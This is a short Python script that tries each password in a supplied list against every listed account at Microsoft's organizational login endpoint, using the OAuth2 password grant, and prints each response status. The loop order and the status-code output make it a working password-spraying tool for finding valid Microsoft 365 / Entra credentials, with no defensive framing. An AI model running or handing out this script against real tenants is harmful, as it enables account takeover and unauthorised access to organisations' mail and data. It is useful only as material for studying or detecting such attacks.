import os
import requests

users = os.environ['ACCOUNT_SET'].split(',')
passwords = os.environ['CANDIDATE_SET'].split(',')
client_id = os.environ['CLIENT_ID']
for password in passwords:
    for username in users:
        response = requests.post(
            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
            data={'grant_type': 'password', 'client_id': client_id,
                  'username': username, 'password': password,
                  'scope': 'https://graph.microsoft.com/.default'},
            timeout=20,
        )
        print(username, response.status_code)
